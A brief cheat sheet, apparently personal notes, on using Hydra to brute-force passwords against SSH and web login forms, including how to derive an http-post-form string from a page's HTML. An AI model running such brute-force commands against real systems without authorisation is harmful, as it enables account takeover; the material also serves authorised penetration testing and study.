# Tools - HYDRA - Password Cracking

Hydra is a tools for password cracking using a brute force method.

hydra could be use to cracking SSH and WEB.

* SSH
    simple command:
    [hydra -l user.name -P pass.file [TARGET_IP]] ssh

    for advance command use hydra -h and read it.

* WEB
    
    Before using hydra make the formula first using the HTML page source.
    what to look :
    - action: /login
    - method : post/get
    - input1 name: username/email/user
    - input2 name: password/pass/input
    - failed message: "failed"/"authentication failed"
    
    after that, combine it:
    
    http-post-form "/action:input1=^USER^&input2=^PASS^:fail message."

    then use hydra as usual so it become:

    [hydra -l user -P pass.txt [TARGET_IP] http-post-form "/action:input1=^USER^&input2=^PASS^:fail message."]

    